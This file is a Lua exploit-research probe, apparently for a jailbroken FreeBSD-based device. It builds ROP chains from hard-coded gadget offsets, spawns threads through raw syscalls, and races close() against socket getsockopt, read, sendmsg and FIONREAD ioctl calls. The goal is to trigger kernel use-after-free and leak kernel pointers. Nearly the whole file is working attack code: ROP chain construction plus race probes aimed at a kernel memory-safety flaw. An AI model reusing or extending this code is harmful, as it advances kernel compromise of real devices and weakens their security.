-- CRASH_CLASS: MODERATE
-- PROBE 93e7: lean socket operation races during close
--
-- Previous probes crashed from thread exhaustion or blocking.
-- This one: 5 iterations per section, SOCK_DGRAM, non-blocking.
-- Tests: recvmsg MSG_PEEK, getsockopt, getpeername vs close from child.

print("=== PROBE 93e7: SOCKET RACE (lean) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function split(val)
    if val == nil then return 0, 0 end
    if type(val) == "number" then
        if val < 0 then val = val + 0x100000000 end
        if val >= 0x100000000 then
            local hi = math.floor(val / 0x100000000)
            return val - hi * 0x100000000, hi
        end
        return val, 0
    end
    if type(val) == "table" and val.h then
        local h, l = val.h, val.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return l, h
    end
    return 0, 0
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sa = memory.alloc(32); wq(N(sa), uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local function eoff(off)
    local lo = elo + off; local hi = ehi
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return lo, hi
end

local par_lo, par_hi = eoff(0x992)
local pdr_lo, pdr_hi = eoff(0xC9DFE)
local psr_lo, psr_hi = eoff(0xD77D)
local prdx_lo, prdx_hi = eoff(0x3B02D7)
local prc_lo, prc_hi = eoff(0xE64)
local pr8_lo, pr8_hi = eoff(0x991)
local bret_lo, bret_hi = eoff(0x42)
local mwr_lo, mwr_hi = eoff(0x92C67)
local stub_lo, stub_hi = split(stub)

local function spawn_child(calls, done_addr)
    local tcb = memory.alloc(0x1000)
    local tcb_a = N(tcb); local tcb_lo, tcb_hi = split(tcb)
    for i = 0, 0xFF8, 8 do wd(tcb_a + i, tcb_lo); wd(tcb_a + i + 4, tcb_hi) end
    local fs_ptr = memory.alloc(8)
    wd(N(fs_ptr), tcb_lo); wd(N(fs_ptr) + 4, tcb_hi)
    local fsptr_lo, fsptr_hi = split(N(fs_ptr))
    local done_lo, done_hi = split(done_addr)
    local stk = memory.alloc(0x200000)
    local sb = N(stk); local ss = 0x100000
    local rsp = sb + ss - ((sb + ss) % 16) - 8
    local pos = 0
    local function put(lo, hi) wd(rsp + pos*8, lo); wd(rsp + pos*8 + 4, hi or 0); pos = pos + 1 end
    put(pdr_lo, pdr_hi); put(129, 0)
    put(psr_lo, psr_hi); put(fsptr_lo, fsptr_hi)
    put(par_lo, par_hi); put(165, 0)
    put(stub_lo, stub_hi)
    for _, c in ipairs(calls) do
        if #c >= 2 then put(pdr_lo, pdr_hi); local l,h = split(c[2]); put(l, h) end
        if #c >= 3 then put(psr_lo, psr_hi); local l,h = split(c[3]); put(l, h) end
        if #c >= 4 then put(prdx_lo, prdx_hi); local l,h = split(c[4]); put(l, h) end
        if #c >= 5 then put(prc_lo, prc_hi); local l,h = split(c[5]); put(l, h) end
        if #c >= 6 then put(pr8_lo, pr8_hi); local l,h = split(c[6]); put(l, h) end
        put(par_lo, par_hi); put(c[1], 0)
        put(stub_lo, stub_hi)
    end
    put(par_lo, par_hi); put(0xD09E93E7, 0)
    put(pdr_lo, pdr_hi); put(done_lo, done_hi)
    put(mwr_lo, mwr_hi)
    put(pdr_lo, pdr_hi); put(0, 0)
    put(par_lo, par_hi); put(431, 0)
    put(stub_lo, stub_hi)
    local par = memory.alloc(0x40); local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa, uint64(string.format("0x%X%08X", bret_hi, bret_lo)))
    wq(pa + 8, uint64(0))
    wq(pa + 0x10, uint64(sb)); wq(pa + 0x18, uint64(ss))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(pa + 0x30, tid)
    local ok1, rv1 = pcall(function() return mk(455)(par, uint64(0x38)) end)
    return ok1 and N(rv1) == 0
end

-- ======== SECTION A: getsockopt SO_TYPE/SO_ERROR vs close ========
print("--- Section A: getsockopt vs close ---")
local sopt_anom = 0
for iter = 1, 5 do
    if not alive() then print("DEAD"); break end
    local sv = memory.alloc(16); wd(N(sv), 0); wd(N(sv)+4, 0)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), sv) end)
    local fd0 = rd(N(sv)) or -1; local fd1 = rd(N(sv)+4) or -1
    if fd0 < 0 then break end

    local done = memory.alloc(8); wd(N(done), 0)
    spawn_child({{6, fd0}}, N(done))

    -- getsockopt(fd0, SOL_SOCKET, SO_TYPE)
    local outval = memory.alloc(16); for j=0,12,4 do wd(N(outval)+j, 0xDEAD0000+j) end
    local outlen = memory.alloc(8); wd(N(outlen), 16)
    local ok_g, rv_g = pcall(function()
        return mk(118)(uint64(fd0), uint64(0xFFFF), uint64(0x1008), uint64(N(outval)), uint64(N(outlen)))
    end)
    local g_ret = ok_g and N(rv_g) or -999
    if g_ret >= 0x80000000 then g_ret = g_ret - 0x100000000 end
    for w=1,50000 do if (rd(N(done)) or 0) ~= 0 then break end end

    local v0 = rd(N(outval)) or 0
    local v4 = rd(N(outval)+4) or 0
    print(string.format("  iter %d: getsockopt=%d val=0x%08X 0x%08X", iter, g_ret, v0, v4))

    pcall(function() mk(6)(uint64(fd0)) end)
    pcall(function() mk(6)(uint64(fd1)) end)
end
print(string.format("getsockopt anomalies=%d", sopt_anom))

-- ======== SECTION B: read() vs close on socket with data ========
print("")
print("--- Section B: read vs close (socket with data) ---")
local read_anom = 0
for iter = 1, 5 do
    if not alive() then print("DEAD"); break end
    local sv = memory.alloc(16); wd(N(sv), 0); wd(N(sv)+4, 0)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), sv) end)
    local fd0 = rd(N(sv)) or -1; local fd1 = rd(N(sv)+4) or -1
    if fd0 < 0 then break end

    -- Send data so fd1 has something to read
    local wbuf = memory.alloc(64)
    for j = 0, 60, 4 do wd(N(wbuf)+j, 0xBB000000 + iter*64 + j) end
    pcall(function() mk(4)(uint64(fd0), uint64(N(wbuf)), uint64(64)) end)

    local done = memory.alloc(8); wd(N(done), 0)
    spawn_child({{6, fd1}}, N(done))

    -- Main: read from fd1 while child closes it
    local rbuf = memory.alloc(128)
    for j = 0, 124, 4 do wd(N(rbuf)+j, 0xCC000000+j) end
    local ok_r, rv_r = pcall(function()
        return mk(3)(uint64(fd1), uint64(N(rbuf)), uint64(128))
    end)
    local r_ret = ok_r and N(rv_r) or -999
    if r_ret >= 0x80000000 then r_ret = r_ret - 0x100000000 end
    for w=1,50000 do if (rd(N(done)) or 0) ~= 0 then break end end

    -- Scan for kernel pointers in read data
    local kptrs = 0
    if r_ret > 0 then
        for j = 0, math.min(r_ret-1, 120), 4 do
            local lo = rd(N(rbuf)+j) or 0
            local hi = rd(N(rbuf)+j+4) or 0
            if lo < 0 then lo = lo + 0x100000000 end
            if hi < 0 then hi = hi + 0x100000000 end
            if hi >= 0xFFFF8000 and hi < 0xFFFFFF00 then
                kptrs = kptrs + 1
                print(string.format("  iter %d +%02X: KPTR 0x%08X%08X", iter, j, hi, lo))
            end
        end
    end
    print(string.format("  iter %d: read=%d kptrs=%d", iter, r_ret, kptrs))
    read_anom = read_anom + kptrs

    pcall(function() mk(6)(uint64(fd0)) end)
    pcall(function() mk(6)(uint64(fd1)) end)
end
print(string.format("read anomalies=%d", read_anom))

-- ======== SECTION C: sendmsg with control data vs close ========
-- send ancillary data (SCM_TIMESTAMP request) while closing
print("")
print("--- Section C: sendmsg vs close ---")
local send_anom = 0
for iter = 1, 5 do
    if not alive() then print("DEAD"); break end
    local sv = memory.alloc(16); wd(N(sv), 0); wd(N(sv)+4, 0)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), sv) end)
    local fd0 = rd(N(sv)) or -1; local fd1 = rd(N(sv)+4) or -1
    if fd0 < 0 then break end

    local done = memory.alloc(8); wd(N(done), 0)
    spawn_child({{6, fd0}}, N(done))

    -- Main: sendmsg(fd0, &msg, 0)
    local data = memory.alloc(32)
    for j = 0, 28, 4 do wd(N(data)+j, 0xDD000000+iter+j) end
    local iov = memory.alloc(16)
    wq(N(iov), uint64(N(data))); wq(N(iov)+8, uint64(32))
    local msg = memory.alloc(64)
    for j = 0, 60, 4 do wd(N(msg)+j, 0) end
    wq(N(msg)+0x10, uint64(N(iov))); wq(N(msg)+0x18, uint64(1))

    local ok_s, rv_s = pcall(function()
        return mk(28)(uint64(fd0), uint64(N(msg)), uint64(0))
    end)
    local s_ret = ok_s and N(rv_s) or -999
    if s_ret >= 0x80000000 then s_ret = s_ret - 0x100000000 end
    for w=1,50000 do if (rd(N(done)) or 0) ~= 0 then break end end

    print(string.format("  iter %d: sendmsg=%d", iter, s_ret))

    pcall(function() mk(6)(uint64(fd0)) end)
    pcall(function() mk(6)(uint64(fd1)) end)
end
print(string.format("sendmsg anomalies=%d", send_anom))

-- ======== SECTION D: ioctl FIONREAD vs close ========
-- FIONREAD reads socket buffer length - dereferences so_rcv
print("")
print("--- Section D: ioctl FIONREAD vs close ---")
local ioctl_anom = 0
for iter = 1, 5 do
    if not alive() then print("DEAD"); break end
    local sv = memory.alloc(16); wd(N(sv), 0); wd(N(sv)+4, 0)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), sv) end)
    local fd0 = rd(N(sv)) or -1; local fd1 = rd(N(sv)+4) or -1
    if fd0 < 0 then break end

    -- Send some data so FIONREAD has something to report
    local wbuf = memory.alloc(64)
    for j = 0, 60, 4 do wd(N(wbuf)+j, 0xEE000000+iter) end
    pcall(function() mk(4)(uint64(fd0), uint64(N(wbuf)), uint64(64)) end)

    local done = memory.alloc(8); wd(N(done), 0)
    spawn_child({{6, fd1}}, N(done))

    -- Main: ioctl(fd1, FIONREAD=0x4004667F, &nbytes)
    local nbytes = memory.alloc(8); wd(N(nbytes), 0xDEADDEAD)
    local ok_i, rv_i = pcall(function()
        return mk(54)(uint64(fd1), uint64(0x4004667F), uint64(N(nbytes)))
    end)
    local i_ret = ok_i and N(rv_i) or -999
    if i_ret >= 0x80000000 then i_ret = i_ret - 0x100000000 end
    for w=1,50000 do if (rd(N(done)) or 0) ~= 0 then break end end

    local nb_val = rd(N(nbytes)) or 0
    print(string.format("  iter %d: ioctl=%d nbytes=%d", iter, i_ret, nb_val))

    -- If FIONREAD returned a massive value, it read from freed memory
    if i_ret == 0 and nb_val > 0x10000 then
        ioctl_anom = ioctl_anom + 1
        print(string.format("  iter %d: LARGE FIONREAD 0x%08X", iter, nb_val))
    end

    pcall(function() mk(6)(uint64(fd0)) end)
    pcall(function() mk(6)(uint64(fd1)) end)
end
print(string.format("ioctl anomalies=%d", ioctl_anom))

print("")
print("alive=" .. tostring(alive()))
print("=== 93e7 COMPLETE ===")
